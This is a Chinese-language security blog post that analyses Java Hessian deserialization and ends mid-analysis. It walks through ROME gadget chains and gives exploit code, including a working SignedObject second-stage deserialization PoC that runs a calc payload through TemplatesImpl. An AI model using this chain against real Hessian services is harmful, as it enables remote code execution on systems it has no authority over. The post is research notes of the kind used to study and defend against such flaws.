<!DOCTYPE html>
<html lang="en" color-mode="light">
  <head><meta name="referrer" content="no-referrer"/><meta name="generator" content="Hexo 6.3.0"></head>

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  
  <meta name="author" content="John Doe" />
  <meta name="description" content="" />
  
  
  <title>
    
      Hessian反序列化 
      
      
      |
    
     Prove yourself
  </title>

  
    <link rel="apple-touch-icon" href="/images/myblog.ico">
    <link rel="icon" href="/images/myblog.ico">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- 代码块风格 -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
</head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/me.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">Aecous</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">Hessian反序列化</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
          2023-07-26 05:21:13
        </span>
        
      </div>
      <div class="markdown-body">
        <p>这次写的比较粗糙，因为是写的给自己看的，就没怎么细致的讲解</p>
<h3 id="hessian介绍"><a href="#hessian介绍" class="headerlink" title="hessian介绍"></a>hessian介绍</h3><blockquote>
<p>Hessian 是一个用于连接网络服务的二进制协议，他的com.caucho.hessian.client 和 com.caucho.hessian.server包不依赖于任何其他Resin的类(Resin是caucho公司的一个很快的Web服务器，Hessian是他的一部分)，因此他能够应用于更小的客户端，比如Java Applet。其实也是因为不依赖所以也可以在任何容器比如Tomcat，Jetty中很方便的使用。</p>
</blockquote>
<blockquote>
<p>Hessian官方用户文档： <a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/31862">https://developer.aliyun.com/article/31862</a></p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690218768748-25ef81c4-b47a-42c0-8dec-bb2b3feb5c77.png#averageHue=%23a9b6a7&clientId=u3806880a-78e5-4&from=paste&height=950&id=u19adf6d2&originHeight=950&originWidth=1248&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=102238&status=done&style=none&taskId=u9bc16b8a-fb21-48d7-b822-8c6c70da75c&title=&width=1248" alt="image.png"></p>
<h3 id="Hessian序列化和反序列化"><a href="#Hessian序列化和反序列化" class="headerlink" title="Hessian序列化和反序列化"></a>Hessian序列化和反序列化</h3><p>hessian依赖有好几个，其大部分功能都是一样的，只不过在序列化和反序列化时需要使用一些方法</p>
<h4 id="com-caucho-hessian"><a href="#com-caucho-hessian" class="headerlink" title="com.caucho.hessian"></a>com.caucho.hessian</h4><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.caucho<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>hessian<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.0.63<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="com-alipay-sofa-hessian"><a href="#com-alipay-sofa-hessian" class="headerlink" title="com.alipay.sofa.hessian"></a>com.alipay.sofa.hessian</h4><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alipay.sofa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>hessian<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.3.13<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>序列化和反序列化都是一样的</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//Hessian序列化,返回字节码base64加密后的字符串</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token class-name">Hessian_serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">ByteArrayOutputStream</span> bao <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">HessianOutput</span> hessianOutput <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HessianOutput</span><span class="token punctuation">(</span>bao<span class="token punctuation">)</span><span class="token punctuation">;</span>
    hessianOutput<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>bao<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//Hessian反序列化，将poc进行Base64解密成字节码读取进行反序列化</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Hessian_unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> poc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">ByteArrayInputStream</span> bai <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">HessianInput</span> hessianInput <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HessianInput</span><span class="token punctuation">(</span>bai<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Object</span> o <span class="token operator">=</span> hessianInput<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//hessian2的序列化</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token class-name">Hessian2_Serial</span><span class="token punctuation">(</span><span class="token class-name">Object</span> o<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">ByteArrayOutputStream</span> baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Hessian2Output</span> hessian2Output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hessian2Output</span><span class="token punctuation">(</span>baos<span class="token punctuation">)</span><span class="token punctuation">;</span>
    hessian2Output<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
    hessian2Output<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token comment">//hessian2的反序列化</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token class-name">Hessian2_Deserial</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">ByteArrayInputStream</span> bais <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Hessian2Input</span> hessian2Input <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hessian2Input</span><span class="token punctuation">(</span>bais<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Object</span> o <span class="token operator">=</span> hessian2Input<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> o<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="失败的poc及原因"><a href="#失败的poc及原因" class="headerlink" title="失败的poc及原因"></a>失败的poc及原因</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java">hessianinput<span class="token punctuation">.</span>readObject
    hashmap<span class="token punctuation">.</span>put
	    <span class="token class-name">EqualsBean</span><span class="token punctuation">.</span>hashcode
       		 <span class="token class-name">ToStringBean</span><span class="token punctuation">.</span>toString <span class="token operator">--</span><span class="token operator">-></span>getter	<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//自己写的工具类，大概功能就是生成一个装填了执行calc的恶意类的templates类</span>
    <span class="token class-name">Object</span> templates <span class="token operator">=</span> tools<span class="token punctuation">.</span><span class="token function">getTemplates</span><span class="token punctuation">(</span>tools<span class="token punctuation">.</span><span class="token function">getshortclass</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//ROME链的任意getter调用</span>
    <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">EqualsBean</span> equalsBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//手动生成HashMap，防止提前调用hashcode()</span>
    <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> tools<span class="token punctuation">.</span><span class="token function">makeMap</span><span class="token punctuation">(</span>equalsBean<span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token class-name">Hessian_serialize</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Hessian_unserialize</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690219965484-1253a413-8b43-4a72-8f02-0929e2e84667.png#averageHue=%23373631&clientId=u3806880a-78e5-4&from=paste&height=115&id=u31713bfc&originHeight=172&originWidth=690&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=96469&status=done&style=none&taskId=u328f74ae-c759-4059-86ce-6f286225b24&title=&width=460" alt="image.png"><br>很显然，没有计算器弹出，失败了，这是啥原因呢？</p>
<p>在HessianOutput.writeObject中，使用了UnsafeSerializer#introspect方法来获取对象中的字段，判断了成员变量标识符，如果是transient和static字段则不会参与序列化和反序列化流程，<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687874075115-ebfd41e6-f489-4e68-86d1-1326cc27864e.png#averageHue=%23f8f5f0&from=url&id=T10mj&originHeight=145&originWidth=1155&originalType=binary&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&title="><br>我们在触发templates的getter时，需要用到几个参数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690220257752-1bbbbfe1-f53c-4548-8215-5d6930b56211.png#averageHue=%23546758&clientId=u3806880a-78e5-4&from=paste&height=127&id=uc3cab5b7&originHeight=191&originWidth=700&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=79564&status=done&style=none&taskId=u757ce161-d53b-4331-ae35-6e8ea1fceff&title=&width=466.6666666666667" alt="image.png"><br>其中的_tfactory就被transient修饰，导致无法参与序列化和反序列化流程，所以就G了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690220265264-84c24fe8-d111-45cf-b97d-fabae527bfad.png#averageHue=%23527f4d&clientId=u3806880a-78e5-4&from=paste&height=58&id=ud506f43e&originHeight=87&originWidth=592&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=27270&status=done&style=none&taskId=ue5daed5b-3fbe-4c28-bf65-4a36115564d&title=&width=394.6666666666667" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690222140749-717bf669-0acb-4e18-ab03-194cd6e17e90.png#averageHue=%23494b4b&clientId=u3806880a-78e5-4&from=paste&height=376&id=uac250f28&originHeight=564&originWidth=787&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=225961&status=done&style=none&taskId=u31a706b4-e559-4b32-a61f-05daf18e760&title=&width=524.6666666666666" alt="image.png"><br>那么该怎么样才能避开呢？很显然，我们可以使用二次反序列化来触发原生的序列化和反序列化</p>
<h4 id="二次反序列化poc"><a href="#二次反序列化poc" class="headerlink" title="二次反序列化poc"></a>二次反序列化poc</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java">hessianinput<span class="token punctuation">.</span>readObject
    hashmap<span class="token punctuation">.</span>put
        <span class="token class-name">EqualsBean</span><span class="token punctuation">.</span>hashcode
            <span class="token class-name">ToStringBean</span><span class="token punctuation">.</span>toString
                <span class="token class-name">SignedObject</span><span class="token punctuation">.</span>getObject
                        hashmap<span class="token punctuation">.</span>readObject<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-></span>hashmap<span class="token punctuation">.</span>put
        					<span class="token class-name">EqualsBean</span><span class="token punctuation">.</span>hashcode
           						 <span class="token class-name">ToStringBean</span><span class="token punctuation">.</span>toString<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//自己写的工具类，大概功能就是生成一个装填了执行calc的恶意类的templates类</span>
    <span class="token class-name">Object</span> templates <span class="token operator">=</span> tools<span class="token punctuation">.</span><span class="token function">getTemplates</span><span class="token punctuation">(</span>tools<span class="token punctuation">.</span><span class="token function">getshortclass</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">EqualsBean</span> equalsBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">HashMap</span> hashMap1 <span class="token operator">=</span> tools<span class="token punctuation">.</span><span class="token function">makeMap</span><span class="token punctuation">(</span>equalsBean<span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//直接修改map中的键值对，直接put就会触发hashcode</span>

    <span class="token comment">//signObject装填</span>
    <span class="token class-name">KeyPairGenerator</span> kpg <span class="token operator">=</span> <span class="token class-name">KeyPairGenerator</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    kpg<span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">KeyPair</span> kp <span class="token operator">=</span> kpg<span class="token punctuation">.</span><span class="token function">generateKeyPair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">SignedObject</span> signedObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SignedObject</span><span class="token punctuation">(</span>hashMap1<span class="token punctuation">,</span> kp<span class="token punctuation">.</span><span class="token function">getPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Signature</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">ToStringBean</span> toStringBean1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">SignedObject</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>signedObject<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">EqualsBean</span> equalsBean1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>toStringBean1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> tools<span class="token punctuation">.</span><span class="token function">makeMap</span><span class="token punctuation">(</span>equalsBean1<span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//序列化和反序列化</span>
    <span class="token class-name">Hessian_unserialize</span><span class="token punctuation">(</span><span class="token class-name">Hessian_serialize</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690221986711-3bd1ac65-9ab1-475c-a5e3-47cd31688ffd.png#averageHue=%2340423d&clientId=u3806880a-78e5-4&from=paste&height=523&id=u7f437cc2&originHeight=784&originWidth=1083&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=350572&status=done&style=none&taskId=ua37d539b-3391-4c5f-991a-21b9e7b37a7&title=&width=722" alt="image.png"><br>成功执行</p>
<h4 id="writeObject"><a href="#writeObject" class="headerlink" title="writeObject"></a>writeObject</h4><p>太麻烦了，不想讲，大概就是会进行序列化类内容的检测，上面有讲，然后会通过它内部的一个map？，这样储存数据 map(hashMap.key,hashMap.key) 大概是这样？，反正就是会把hashmap里的键，拿出来创建一个新的map，键值都是这个键，hashmap的值也一样，讲的不清楚很正常，因为它调用太长了，我也不太懂<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690224878898-2370b75a-1d9b-4ef3-bba1-d83a4056bcc8.png#averageHue=%23434947&clientId=u3806880a-78e5-4&from=paste&height=311&id=u8a3d935e&originHeight=466&originWidth=930&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=199949&status=done&style=none&taskId=ueac0ba0e-9fa3-411d-8ad0-9199952408d&title=&width=620" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690224892275-c74f8c0a-4f95-4956-842a-3d02fd3c9be9.png#averageHue=%233a3f3f&clientId=u3806880a-78e5-4&from=paste&height=395&id=u2e785729&originHeight=592&originWidth=847&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=217208&status=done&style=none&taskId=u22e85304-eba0-45cc-b1f0-20ab9b6544b&title=&width=564.6666666666666" alt="image.png"><br>呃呃看了一眼<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690224959055-8f2066b9-0076-4451-82f4-8c6eda4c5c4c.png#averageHue=%233d4247&clientId=u3806880a-78e5-4&from=paste&height=305&id=u211e33c0&originHeight=458&originWidth=481&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=39843&status=done&style=none&taskId=u063c94c4-5bbe-42e2-9cd4-a28c177d97a&title=&width=320.6666666666667" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690225002402-99418867-edef-4ef6-8e2c-13196441b966.png#averageHue=%23444846&clientId=u3806880a-78e5-4&from=paste&height=200&id=ua49f6704&originHeight=300&originWidth=928&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=149249&status=done&style=none&taskId=u4ab60d15-b406-4119-8c87-eeba6262d85&title=&width=618.6666666666666" alt="image.png"><br>OK破案了，是tools.makeMap的构造导致的。<br>正常创建的hashmap结构如下</p>
<blockquote>
<p>HashMap hashMap3 &#x3D; new HashMap();<br>hashMap3.put(“key1”,”value1”);</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690225139892-64c4fc7e-693c-41b7-85f1-4f7413df0927.png#averageHue=%233d4247&clientId=u3806880a-78e5-4&from=paste&height=392&id=u26d2bfde&originHeight=588&originWidth=476&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=33325&status=done&style=none&taskId=u3e6ce20f-3b1b-41ab-97b2-fa664dbb8c3&title=&width=317.3333333333333" alt="image.png"></p>
<p>使用tools.makemap创建的结构</p>
<blockquote>
<p>HashMap hashMap &#x3D; tools.makeMap(equalsBean1,”1”);</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690225188869-2c9be502-3fa2-4ca4-aefc-a76fa58bd404.png#averageHue=%233d4247&clientId=u3806880a-78e5-4&from=paste&height=392&id=ud01e12de&originHeight=588&originWidth=476&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=39975&status=done&style=none&taskId=u99548668-6965-4c0f-a801-55faf079d24&title=&width=317.3333333333333" alt="image.png"><br>有两组键值对</p>
<p>看眼makemap的源码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690225437976-bf3600a3-0fe8-4c40-8ea2-c2fe81242eb1.png#averageHue=%233e4642&clientId=u3806880a-78e5-4&from=paste&height=269&id=ue7de008d&originHeight=403&originWidth=1009&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=197425&status=done&style=none&taskId=ucb496770-ab7f-4cca-b7d1-bc6d6e6cc6b&title=&width=672.6666666666666" alt="image.png"><br>看了眼，键值对是储存在hashmap的table参数中的，这里就直接通过反射赋值的方式，将键值对直接赋进了hashmap，不需要走hashmap.put去赋值，就避免了直接触发hashcode导致链子触发</p>
<p>不过直接用hashmap put也行，影响不大，只不过会执行而已，也可以直接在生成templates时不填恶意类字节码，最后在反射该值</p>
<h4 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h4><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690230933899-06f9eebb-32d3-47f7-8c58-a1df3f96e4ca.png#averageHue=%23405943&clientId=u3806880a-78e5-4&from=paste&height=153&id=uc65ba761&originHeight=229&originWidth=600&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=63988&status=done&style=none&taskId=ua50bec58-f5e2-4846-98d7-20aadc1c860&title=&width=400" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690230953044-5758f166-5b06-472d-a213-2163c7af2096.png#averageHue=%23353938&clientId=u3806880a-78e5-4&from=paste&height=243&id=uf8fb4cb6&originHeight=364&originWidth=794&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=99052&status=done&style=none&taskId=u3c327f11-83a9-4608-bd3c-bbeca6d6c70&title=&width=529.3333333333334" alt="image.png"><br>从bytes中读一个tag出来<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690230969325-aec68a40-ed61-4a8a-865d-a5db2853096f.png#averageHue=%233d454a&clientId=u3806880a-78e5-4&from=paste&height=75&id=u1c1d63a6&originHeight=113&originWidth=363&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=20479&status=done&style=none&taskId=udfeb8b90-e050-4350-bd7a-5e53d90476a&title=&width=242" alt="image.png">可以看见首位是77<br><img 